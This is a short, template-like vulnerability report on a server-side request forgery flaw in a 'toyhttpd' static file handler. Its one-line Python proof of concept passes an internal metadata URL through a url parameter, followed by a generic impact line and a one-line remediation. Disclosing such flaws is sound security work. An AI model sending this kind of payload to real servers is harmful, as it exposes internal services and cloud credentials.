# SSRF in toyhttpd static file handler

Vulnerability Type: Server-Side Request Forgery
CVSS Score: 8.6

Proof of Concept:
```python
import requests
# exploit code here
requests.get("https://example.com/static?url=http://metadata.internal/")
```

This could allow an attacker to reach internal services. It is important to
note that SSRF is part of the OWASP Top 10.

Impact: internal network access.
Remediation: validate URLs.
